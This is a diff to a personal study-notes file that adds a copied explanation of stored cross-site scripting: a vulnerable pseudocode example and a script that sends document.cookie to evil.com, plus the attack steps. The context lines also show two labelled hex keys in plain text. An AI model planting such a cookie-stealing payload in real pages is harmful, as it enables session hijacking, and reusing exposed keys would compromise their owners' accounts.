@@ -2,3 +2,43 @@ datastructure learning:  https://www.geeksforgeeks.org/data-structures/
 
 keyfor rohitgupta: db29353ec440b55b4dcd95f7170c3f5f
 keyfor default: 16538808c312f09508fc6c9676fc02ca
+
+https://www.acunetix.com/websitesecurity/cross-site-scripting/
+Cross-site Scripting (XSS)
+ is a client-side code injection attack. The attacker aims to execute malicious scripts in a web browser of the victim by
+ including malicious code in a legitimate web page or web application. The actual attack occurs when the victim visits the web
+ page or web application that executes the malicious code. The web page or web application becomes a vehicle to deliver the malicious
+ script to the user’s browser. Vulnerable vehicles that are commonly used for Cross-site Scripting attacks are forums, message boards,
+ and web pages that allow comments.
+
+The following is a snippet of server-side pseudocode that is used to display the most recent comment on a web page:
+print "<html>"
+print "<h1>Most recent comment</h1>"
+print database.latestComment
+print "</html>"
+
+The above script simply takes the latest comment from a database and includes it in an HTML page. It assumes that the comment
+printed out consists of only text and contains no HTML tags or other code. It is vulnerable to XSS, because an attacker could submit
+a comment that contains a malicious payload, for example:
+<script>doSomethingEvil();</script>
+The web server provides the following HTML code to users that visit this web page:
+<html>
+<h1>Most recent comment</h1>
+<script>doSomethingEvil();</script>
+</html>
+When the page loads in the victim’s browser, the attacker’s malicious script executes. Most often, the victim does not realize
+it and is unable to prevent such an attack.
+
+Criminals often use XSS to steal cookies. This allows them to impersonate the victim. The attacker can send the cookie to their own server in many ways.
+One of them is to execute the following client-side script in the victim’s browser:
+<script>
+window.location="http://evil.com/?cookie=" + document.cookie
+</script>
+process to XSS:
+The attacker injects a payload into the website’s database by submitting a vulnerable form with malicious JavaScript content.
+The victim requests the web page from the web server.
+The web server serves the victim’s browser the page with attacker’s payload as part of the HTML body.
+The victim’s browser executes the malicious script contained in the HTML body. In this case, it sends the victim’s cookie to the attacker’s server.
+The attacker now simply needs to extract the victim’s cookie when the HTTP request arrives at the server.
+The attacker can now use the victim’s stolen cookie for impersonation.
+
